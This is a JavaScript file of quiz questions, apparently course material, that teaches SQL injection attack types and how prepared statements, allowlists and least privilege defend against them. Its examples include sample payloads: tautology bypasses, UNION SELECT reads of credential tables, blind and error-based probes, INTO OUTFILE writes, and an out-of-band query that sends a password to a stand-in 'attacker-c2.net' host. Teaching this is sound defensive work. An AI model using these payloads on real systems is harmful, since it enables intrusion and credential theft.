// topic10_files/topic10_questions.js
// Topic 10: SQL Injection (SQLi) Vulnerabilities: Attack Vectors and Parameterized Queries / Prepared Statements Defense

const questions = [
  {
    question: "What is SQL Injection (SQLi), and what is its root architectural cause?",
    shortAnswer: "SQLi occurs when untrusted user input is directly concatenated into a dynamic SQL string, allowing user data to be interpreted by the database parser as executable SQL commands.",
    explanation: "The root cause of SQL injection is the failure to separate data from code. When an application builds SQL statements by joining strings with user input, an attacker can supply SQL keywords, quotes, or comment characters to rewrite the query execution structure.",
    hint: "Think about user data being mistakenly executed as SQL commands due to string concatenation.",
    level: "basic",
    codeExample: `// Vulnerable Code:
const query = "SELECT * FROM users WHERE user = '" + req.body.username + "'";
// If user sends: admin' OR '1'='1
// Query becomes: SELECT * FROM users WHERE user = 'admin' OR '1'='1'`
  },
  {
    question: "How do Parameterized Queries (Prepared Statements) mathematically neutralize SQL Injection?",
    shortAnswer: "By separating query compilation from data binding: the SQL query structure is parsed and compiled first, and parameters are sent separately as pure literal values that can never be executed as code.",
    explanation: "In a prepared statement, MySQL compiles the query parse tree before receiving the parameter values. When parameters are subsequently supplied, the database treats them strictly as literal data strings or integers, completely ignoring any quotes, SQL syntax, or SQL keywords within them.",
    hint: "The query parser compiles the statement before parameter values are ever evaluated.",
    level: "basic",
    codeExample: `-- MySQL Prepared Statement:
PREPARE stmt FROM 'SELECT * FROM users WHERE user = ? AND pass = ?';
SET @u = "admin' OR '1'='1", @p = 'password';
EXECUTE stmt USING @u, @p;
-- Evaluates literally looking for a username equal to the string "admin' OR '1'='1"`
  },
  {
    question: "What is a 'Tautology' or Authentication Bypass attack in SQL Injection?",
    shortAnswer: "An injection payload (such as `' OR '1'='1' -- `) that alters the WHERE clause logic so that it always evaluates to TRUE, bypassing password verification.",
    explanation: "In a query like `SELECT * FROM users WHERE username = 'USER' AND password = 'PASS'`, injecting `' OR '1'='1' -- ` causes the condition to evaluate as `TRUE`, returning the first row in the table (typically the administrator) regardless of the password.",
    hint: "Payloads that force boolean expressions to evaluate to TRUE unconditionally.",
    level: "basic",
    codeExample: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'`
  },
  {
    question: "What is a UNION-Based SQL Injection attack?",
    shortAnswer: "An attack where the attacker appends a `UNION SELECT` statement to the original query to exfiltrate data from other tables into the application response.",
    explanation: "If an application displays search results from `SELECT item_name, price FROM products WHERE category = 'X'`, injecting `' UNION SELECT username, password_hash FROM admin_users -- ` merges administrative credentials into the returned product list.",
    hint: "Appends UNION SELECT to merge results from sensitive tables.",
    level: "intermediate",
    codeExample: `SELECT item_name, price FROM products 
WHERE category = 'electronics' UNION SELECT user, authentication_string FROM mysql.user -- '`
  },
  {
    question: "What is Blind SQL Injection, and what are its two primary variants?",
    shortAnswer: "An injection where the application does not return query results or errors on screen; partitioned into Boolean-Based Blind and Time-Based Blind.",
    explanation: "In blind SQL injection, the attacker cannot see data directly. In Boolean-based blind, they observe TRUE/FALSE application behavior changes. In Time-based blind, they use database sleep functions (e.g. `IF(condition, SLEEP(5), 0)`) to infer characters byte-by-byte based on server response latency.",
    hint: "Inferring data via True/False differences or server response delays.",
    level: "intermediate",
    codeExample: `-- Time-based blind payload in MySQL:
SELECT * FROM orders WHERE order_id = 10 AND IF(SUBSTRING(version(),1,1)='8', SLEEP(5), 0);`
  },
  {
    question: "What is Second-Order SQL Injection?",
    shortAnswer: "An attack where the malicious payload is safely stored in the database during an initial operation, but executed as dynamic SQL when read and concatenated by a subsequent query later.",
    explanation: "For example, a user registers with a username containing an injection payload (e.g. `admin'--`). The registration uses prepared statements so no injection occurs initially. Later, an automated nightly billing script concatenates the stored username into raw dynamic SQL, triggering the payload.",
    hint: "Payload is stored harmlessly first, then executed dynamically in a secondary query.",
    level: "expert",
    codeExample: `// Registration: Safely stored in DB via prepared statement
// Admin script later: "UPDATE accounts SET balance = 0 WHERE username = '" + row.username + "'" → EXPLODES!`
  },
  {
    question: "Why is manual string escaping (such as `addslashes()` or legacy escaping functions) fundamentally unsafe compared to true parameterized queries?",
    shortAnswer: "Because character encoding mismatches (such as GBK or Big5 multibyte encodings) can allow attackers to inject bytes that consume the backslash escape character, resurrecting the malicious quote.",
    explanation: "In multibyte encodings, injecting `%bf%27` causes `addslashes` to insert a backslash `%5c`, forming `%bf%5c%27`. The database interprets `%bf%5c` as a single valid multibyte character, leaving the single quote `%27` unescaped and active. Prepared statements do not rely on character escaping.",
    hint: "Multibyte character encoding tricks can consume escape characters.",
    level: "expert",
    codeExample: `// Multibyte encoding bypass:
// Input: %bf%27 → Escaped: %bf%5c%27 → Parsed by DB as: [Character]%27 (Active Quote!)`
  },
  {
    question: "Can table names and column names be parameterized with `?` placeholders in prepared statements?",
    shortAnswer: "No, SQL syntax requires table and column names to be known at query compilation time; only literal values can be bound to `?` placeholders.",
    explanation: "Executing `PREPARE stmt FROM 'SELECT * FROM ?';` throws a syntax error in MySQL. If an application requires dynamic table or column selection, it must use strict programmatic allowlists.",
    hint: "Placeholders can only represent literal data values, never table or column identifiers.",
    level: "intermediate",
    codeExample: `-- Prohibited (Throws Syntax Error):
-- PREPARE stmt FROM 'SELECT * FROM ? WHERE id = ?';`
  },
  {
    question: "How should an application safely implement dynamic sorting (`ORDER BY`) or dynamic column selection without introducing SQL injection?",
    shortAnswer: "By validating user input against a hardcoded programmatic allowlist (e.g. switch/case or array lookup) before building the query.",
    explanation: "Instead of concatenating raw `req.query.sort` directly into the `ORDER BY` clause, the code checks if the input is in `['price', 'created_at', 'item_name']`. If not present, it defaults to a safe fallback column.",
    hint: "Use strict allowlist mapping for dynamic SQL identifiers.",
    level: "intermediate",
    codeExample: `// Safe dynamic sorting in Node.js:
const ALLOWED_COLUMNS = { 'price': 'price', 'date': 'created_at', 'name': 'item_name' };
const sortColumn = ALLOWED_COLUMNS[req.query.sort] || 'created_at';
const sql = \`SELECT * FROM products ORDER BY \${sortColumn} ASC\`;`
  },
  {
    question: "In Mamata & Susmita's Barrackpore store, a legacy PHP script concatenated customer search inputs into `SELECT * FROM products WHERE name LIKE '%$search%'`. How was this modernized securely?",
    shortAnswer: "They converted the query to a prepared statement and bound the wildcard string to the parameter placeholder: `WHERE name LIKE ?` with `[%${search}%]`.",
    explanation: "Concatenating the `%` wildcard inside the parameter value rather than in the SQL string ensures the input is treated strictly as literal search text, neutralizing injection characters.",
    hint: "Pass the wildcard characters inside the parameter value rather than the SQL string.",
    level: "moderate",
    codeExample: `// Secure LIKE search with Prepared Statements:
const searchTerm = '%' + req.query.search + '%';
const [rows] = await db.execute(
  'SELECT product_id, item_name, price FROM products WHERE item_name LIKE ?',
  [searchTerm]
);`
  },
  {
    question: "In Abhronila & Debangshu's Kolkata fintech bank, an automated payment processor handled ₹50 Crores in daily transactions. How did they enforce zero-trust query security?",
    shortAnswer: "They combined JDBC Prepared Statements across all Java microservices with DB-level `SQL SECURITY DEFINER` stored procedures, completely eliminating raw dynamic SQL.",
    explanation: "Even if an attacker bypassed application-level parameterization, the database user account had 0 direct table privileges and could only invoke parameterized stored procedures.",
    hint: "Combine parameterized queries with stored procedure encapsulation and least privilege.",
    level: "expert",
    codeExample: `// Java JDBC PreparedStatement:
String sql = "{CALL sp_process_transfer(?, ?, ?)}";
CallableStatement stmt = conn.prepareCall(sql);
stmt.setInt(1, fromAccount);
stmt.setInt(2, toAccount);
stmt.setBigDecimal(3, transferAmount);
stmt.execute();`
  },
  {
    question: "What is Error-Based SQL Injection?",
    shortAnswer: "An attack technique where an attacker deliberately crafts payloads that trigger detailed database error messages containing confidential schema data or query results.",
    explanation: "In MySQL, functions like `EXTRACTVALUE()` or `UpdateXML()` can be manipulated to evaluate subqueries inside XPath errors (e.g. `XPATH syntax error: '~8.0.36~'`), leaking database contents directly into error messages.",
    hint: "Forcing database engines to output sensitive data inside syntax error messages.",
    level: "expert",
    codeExample: `SELECT * FROM products WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e));`
  },
  {
    question: "How does disabling detailed database error messages in production protect against SQL injection reconnaissance?",
    shortAnswer: "It prevents attackers from seeing table names, column names, database versions, and SQL fragments in HTTP responses, forcing them into slower blind techniques.",
    explanation: "Production web applications should always catch database exceptions and return generic error pages (e.g. 'Internal Server Error') while logging the stack trace securely to private backend log aggregators.",
    hint: "Hide database error details from public responses to prevent reconnaissance.",
    level: "basic",
    codeExample: `// Generic error response in production:
try {
  await db.execute(sql, params);
} catch (err) {
  logger.error(err); // Private log
  res.status(500).json({ error: "An unexpected error occurred." }); // Generic public response
}`
  },
  {
    question: "What role does an Object-Relational Mapper (ORM) like Prisma, TypeORM, or Hibernate play in SQL injection defense?",
    shortAnswer: "ORMs automatically generate parameterized queries under the hood for standard CRUD operations, abstracting developers from raw string concatenation.",
    explanation: "When using `prisma.user.findMany({ where: { email: input } })`, the ORM uses prepared statements natively. However, using raw query methods (like `prisma.$queryRawUnsafe`) with string concatenation reintroduces SQL injection vulnerabilities.",
    hint: "ORMs use prepared statements by default, but raw query methods can still be vulnerable.",
    level: "intermediate",
    codeExample: `// Safe ORM usage:
await prisma.user.findUnique({ where: { email: userInput } });

// DANGEROUS anti-pattern in ORM:
// await prisma.$queryRawUnsafe(\`SELECT * FROM User WHERE email = '\${userInput}'\`);`
  },
  {
    question: "What is the function of a Web Application Firewall (WAF) in SQL injection defense?",
    shortAnswer: "A WAF acts as an edge perimeter filter inspecting HTTP payloads for known SQL injection patterns and blocking malicious requests before they reach the application server.",
    explanation: "While WAFs (like AWS WAF, Cloudflare, ModSecurity) provide valuable defense-in-depth against automated scanning bots, they are not a replacement for parameterized queries because advanced encoding techniques can sometimes bypass WAF regex signatures.",
    hint: "WAF provides edge perimeter filtering, but parameterized queries remain mandatory.",
    level: "intermediate",
    codeExample: `-- WAF blocks requests containing signatures like 'UNION SELECT' or 'OR 1=1'`
  },
  {
    question: "How does the MySQL system variable `sql_mode = 'NO_BACKSLASH_ESCAPES'` impact SQL injection vectors?",
    shortAnswer: "It disables the use of the backslash character (`\\`) as an escape character, treating backslashes as ordinary string literals.",
    explanation: "When enabled, strings can only be escaped by doubling the quotes (`''`), preventing certain backslash-stripping evasion techniques.",
    hint: "Treats backslashes as literal characters rather than escape markers.",
    level: "expert",
    codeExample: `SET GLOBAL sql_mode = 'NO_BACKSLASH_ESCAPES,STRICT_TRANS_TABLES';`
  },
  {
    question: "How do you execute a Prepared Statement in Python using `mysql-connector-python`?",
    shortAnswer: "Use `cursor.execute(sql, (param1, param2))` passing parameters as a tuple.",
    explanation: "The driver automatically maps placeholders (`%s`) to parameterized query variables.",
    hint: "Pass parameters as a tuple in cursor.execute.",
    level: "basic",
    codeExample: `query = "SELECT user_id, email FROM users WHERE username = %s AND status = %s"
cursor.execute(query, (user_input, "ACTIVE"))
results = cursor.fetchall()`
  },
  {
    question: "What is the difference between client-side parameter emulation and true server-side prepared statements in database drivers?",
    shortAnswer: "Client-side emulation escapes parameters in application memory and sends a single concatenated string to MySQL; server-side prepared statements use the binary protocol to transmit SQL templates and parameters in separate network packets.",
    explanation: "In Node.js `mysql2`, `connection.query()` emulates prepared statements, whereas `connection.execute()` uses true server-side binary protocol prepared statements, delivering optimal security and performance.",
    hint: "True prepared statements use the binary protocol to separate SQL templates from data packets.",
    level: "expert",
    codeExample: `// True server-side prepared statement in mysql2:
const [rows] = await connection.execute('SELECT * FROM accounts WHERE id = ?', [accId]);`
  },
  {
    question: "How does strict input type validation (e.g. `parseInt()` or schema validators like Zod) supplement prepared statements?",
    shortAnswer: "It rejects malformed data at the application boundary before it ever reaches the database layer, enforcing strong data integrity.",
    explanation: "Validating that an `order_id` is strictly a positive integer ensures that non-numeric strings are rejected immediately, reducing database load and eliminating edge-case parsing bugs.",
    hint: "Rejects invalid inputs at the API controller tier before database queries execute.",
    level: "basic",
    codeExample: `// Input validation with Zod in Node.js:
const OrderIdSchema = z.number().int().positive();
const safeOrderId = OrderIdSchema.parse(Number(req.params.id));`
  },
  {
    question: "What is a 'Stacked Queries' attack, and is it supported by default in MySQL client libraries?",
    shortAnswer: "An attack where an attacker injects a semicolon (`;`) followed by a second distinct SQL command (e.g. `1; DROP TABLE users;`); disabled by default in most MySQL client drivers.",
    explanation: "In PHP `mysqli` and Node.js `mysql2`, multi-statement query execution is disabled by default to prevent stacked query execution. However, if `multipleStatements: true` is enabled in connection options, stacked queries become possible.",
    hint: "Executing multiple SQL commands separated by semicolons in a single request.",
    level: "intermediate",
    codeExample: `// Keep multipleStatements disabled in driver settings:
const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user',
  multipleStatements: false // Mandatory security baseline!
});`
  },
  {
    question: "How can SQL Injection lead to Remote Code Execution (RCE) on the database host server if privileges are misconfigured?",
    shortAnswer: "If the database user possesses the `FILE` privilege and `secure_file_priv` is empty, an attacker can use `SELECT ... INTO OUTFILE` to write unauthorized files into filesystem directories.",
    explanation: "By injecting `SELECT 'unauthorized_data' INTO OUTFILE '/var/www/html/unauthorized_export.txt'`, an attacker attempts arbitrary file creation. This is why least privilege must revoke `FILE` privilege from application users.",
    hint: "Writing unauthorized files via INTO OUTFILE when FILE privilege is enabled.",
    level: "expert",
    codeExample: `-- Prohibited in secure deployments by setting secure_file_priv = NULL in my.cnf`
  },
  {
    question: "What is the difference between `mysql_real_escape_string()` and `caching_sha2_password`?",
    shortAnswer: "`mysql_real_escape_string()` is an obsolete client-side string sanitization function; `caching_sha2_password` is a server-side authentication plugin for validating user credentials.",
    explanation: "Escaping functions handle SQL query string formation, whereas authentication plugins handle network handshakes and password verification.",
    hint: "Differentiate between query sanitization functions and connection authentication plugins.",
    level: "basic",
    codeExample: `-- Authentication Plugin: caching_sha2_password
-- Query Sanitization: Prepared Statements (connection.execute)`
  },
  {
    question: "How do you deallocate a prepared statement in MySQL SQL session when it is no longer needed?",
    shortAnswer: "`DEALLOCATE PREPARE statement_name;` (or `DROP PREPARE statement_name;`).",
    explanation: "Deallocating prepared statements frees server-side memory allocations associated with compiled execution plans in that connection session.",
    hint: "Use DEALLOCATE PREPARE stmt_name.",
    level: "intermediate",
    codeExample: `DEALLOCATE PREPARE stmt_find_user;`
  },
  {
    question: "What happens if a user submits SQL code as an input to a prepared statement parameter (e.g. `' DROP TABLE accounts; --`)?",
    shortAnswer: "The entire string is treated literally as text data, resulting in a query searching for rows where the column exactly equals the string `\"' DROP TABLE accounts; --\"`.",
    explanation: "Because the statement is already compiled, the database engine does not invoke the SQL parser on parameter values. The literal text is safely compared against column data with zero execution risk.",
    hint: "The database treats the entire input string as a literal value.",
    level: "basic",
    codeExample: `-- Stored/Searched literally as the text value:
-- "' DROP TABLE accounts; --"`
  },
  {
    question: "What is an Out-of-Band (OOB) SQL Injection attack?",
    shortAnswer: "An attack technique where the database server is forced to initiate an external network connection (such as DNS or HTTP requests) to transmit data to an attacker-controlled server.",
    explanation: "Used when both in-band responses and blind time-based techniques are disabled. In MySQL, functions like `LOAD_FILE(CONCAT('\\\\\\\\', data, '.attacker-c2.net\\\\a'))` trigger Windows SMB DNS resolution queries.",
    hint: "Forcing database servers to make external DNS/HTTP requests to leak data.",
    level: "expert",
    codeExample: `-- Out-of-band DNS exfiltration via SMB UNC path:
-- SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker-c2.net\\\\test'));`
  },
  {
    question: "Why does using `IN (?)` with an array of values require special handling in prepared statements?",
    shortAnswer: "Because a single `?` placeholder represents exactly ONE literal value, not a comma-separated list of values.",
    explanation: "If you bind `[1, 2, 3]` to a single `?`, MySQL interprets it as a single string `'1,2,3'`. To query multiple values, the application must generate one `?` placeholder for each array element: `WHERE id IN (?, ?, ?)`. Drivers like `mysql2` support expanded syntax `IN (?)` automatically.",
    hint: "Each placeholder matches exactly one value; arrays need multiple placeholders.",
    level: "intermediate",
    codeExample: `// Expanding placeholders for arrays:
const ids = [10, 20, 30];
const placeholders = ids.map(() => '?').join(',');
const sql = \`SELECT * FROM orders WHERE order_id IN (\${placeholders})\`;
const [rows] = await connection.execute(sql, ids);`
  },
  {
    question: "How do Static Application Security Testing (SAST) tools detect SQL injection vulnerabilities in source code?",
    shortAnswer: "By performing data flow and taint analysis, tracing untrusted user input from HTTP sources (e.g. `req.body`) to SQL sinks (e.g. `db.query()`) without parameterized sanitization.",
    explanation: "SAST tools (like SonarQube, Semgrep, CodeQL) flag any direct string concatenation feeding into database execution methods.",
    hint: "Taint analysis tracks untrusted input flow into raw SQL sinks.",
    level: "intermediate",
    codeExample: `// SAST flags this taint flow:
// Source: req.body.email → Sink: db.query(\`... \${req.body.email}\`)`
  },
  {
    question: "Can SQL Injection occur in stored procedures?",
    shortAnswer: "Yes, if a stored procedure dynamically constructs SQL strings using `CONCAT()` and executes them via `PREPARE` and `EXECUTE` without parameterization.",
    explanation: "Stored procedures are not automatically immune to SQL injection if developers write dynamic SQL inside them using raw string concatenation.",
    hint: "Dynamic SQL inside stored procedures is vulnerable if constructed with string concatenation.",
    level: "expert",
    codeExample: `-- Vulnerable Stored Procedure:
-- SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', p_input, '\'');
-- PREPARE stmt FROM @sql; EXECUTE stmt;`
  },
  {
    question: "What is the primary operational takeaway of Topic 10 in Module 004_003?",
    shortAnswer: "Parameterized queries (prepared statements) are the non-negotiable primary defense against SQL injection: they mathematically separate code from data. Combine them with the Principle of Least Privilege and strict allowlists for dynamic identifiers.",
    explanation: "SQL injection remains one of the most critical web vulnerabilities. By mandating prepared statements across all application drivers, avoiding raw string concatenation, and restricting database service account privileges, organizations achieve 100% immunity against SQL injection attacks.",
    hint: "Summarize prepared statements, mathematical separation of code and data, and least privilege.",
    level: "basic",
    codeExample: `-- Production Golden Standard:
const [rows] = await connection.execute(
  'SELECT order_id, total_amount, status FROM orders WHERE customer_id = ? AND store_city = ?',
  [safeCustomerId, safeCity]
);`
  }
];

export default questions;
